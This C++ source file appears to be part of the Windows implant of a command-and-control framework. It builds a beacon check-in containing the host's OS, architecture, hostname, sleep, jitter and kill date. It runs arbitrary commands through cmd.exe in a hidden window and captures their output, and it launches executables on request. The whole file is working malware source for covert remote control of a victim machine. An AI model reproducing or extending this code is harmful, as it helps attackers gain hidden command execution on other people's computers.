#include "winsystem.hpp"

std::wstring GetArch(WORD wProcessorArchitecture)
{
	switch (wProcessorArchitecture) {
		case PROCESSOR_ARCHITECTURE_INTEL:
			return L"intel";
		case PROCESSOR_ARCHITECTURE_MIPS:
			return L"mips";
		case PROCESSOR_ARCHITECTURE_ALPHA:
			return L"alpha";
		case PROCESSOR_ARCHITECTURE_PPC:
			return L"ppc";
		case PROCESSOR_ARCHITECTURE_SHX:
			return L"shx";
		case PROCESSOR_ARCHITECTURE_ARM:
			return L"arm";
		case PROCESSOR_ARCHITECTURE_IA64:
			return L"ia64";
		case PROCESSOR_ARCHITECTURE_ALPHA64:
			return L"alpha64"; 
		case PROCESSOR_ARCHITECTURE_MSIL:
			return L"msil";
		case PROCESSOR_ARCHITECTURE_AMD64:
			return L"amd64";
		case PROCESSOR_ARCHITECTURE_IA32_ON_WIN64:
			return L"ia32_on_win64";
		case PROCESSOR_ARCHITECTURE_UNKNOWN:
			return L"unknown";
		default:
			return L"unknown";
		
	}
}

std::wstring GetInitialInfo()
{
    std::wstring wOS = L"windows";
    std::wstring wArch = L"";
    std::wstring wHostname = L"";
	std::wstring wSleep = ConvertStringToWstring(std::to_string(PAYLOAD_SLEEP));
	std::wstring wJitter = ConvertStringToWstring(std::to_string(PAYLOAD_JITTER));
	std::wstring wKillDate = ConvertStringToWstring(std::to_string(PAYLOAD_KILLDATE));

    // Get architecture
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    wArch = GetArch(systemInfo.wProcessorArchitecture);

    // Get hostname and convert it to wstring
	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
	{
		char szHostname[256] = "";
		gethostname(szHostname, 256);
		std::string sHostname = std::string(szHostname, 256);
		wHostname = ConvertStringToWstring(sHostname);
	}

	std::wstring wJson = L"{";
	wJson += L"\"os\":\"" + wOS + L"\"";
	wJson += L",";
	wJson += L"\"arch\":\"" + wArch + L"\"";
	wJson += L",";
	wJson += L"\"hostname\":\"" + wHostname + L"\"";
	wJson += L",";
	wJson += L"\"sleep\":" + wSleep + L"";
	wJson += L",";
	wJson += L"\"jitter\":" + wJitter + L"";
	wJson += L",";
	wJson += L"\"killDate\":" + wKillDate + L"";
	wJson += L"}";

	return wJson;
}

std::wstring ExecuteCmd(const std::wstring& cmd)
{
	std::wstring result;

	SECURITY_ATTRIBUTES sa;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	HANDLE hReadPipe = NULL;
	HANDLE hWritePipe = NULL;
	BOOL bResults = FALSE;

	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
	{
		DisplayErrorMessageBoxW(L"CreatePipe Error");
		return L"";
	}

	if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
	{
		DisplayErrorMessageBoxW(L"SetHandleInformation Error");
		return L"";
	}

	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&si, sizeof(STARTUPINFOW));

	si.cb = sizeof(STARTUPINFOW);
	si.hStdError = hWritePipe;
	si.hStdOutput = hWritePipe;
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;

	// Set application name (full path)
	WCHAR system32Path[MAX_PATH];
	GetSystemDirectoryW(system32Path, MAX_PATH);
	std::wstring wSystem32Path = std::wstring(system32Path);
	const std::wstring applicationName = wSystem32Path + L"\\cmd.exe";
	// const std::wstring applicationName = wSystem32Path + L"\\WindowsPowerShell\\v1.0\powershell.exe";

	// Set command
	std::wstring commandLine = L"/C " + cmd;
	// std::wstring commandLine = L"-c " + cmd;

	bResults = CreateProcessW(
		applicationName.c_str(),
		&commandLine[0],
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);
	if (!bResults)
	{
		DisplayErrorMessageBoxW(L"CreateProcessW Error");
		return L"";
	}

	// Read stdout
	DWORD dwRead;
	CHAR chBuf[4096];
	
	CloseHandle(hWritePipe);

	while (ReadFile(hReadPipe, chBuf, 4095, &dwRead, NULL) && dwRead > 0)
	{
		chBuf[dwRead] = '\0';
		result += std::wstring(chBuf, chBuf + dwRead);
	}

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(hReadPipe);

	return result;
}

BOOL ExecuteFile(const std::wstring& filePath)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcess(
		filePath.c_str(),
		NULL,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	))
	{
		return FALSE;
	}

	WaitForSingleObject(pi.hProcess, INFINITE);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return TRUE;
}
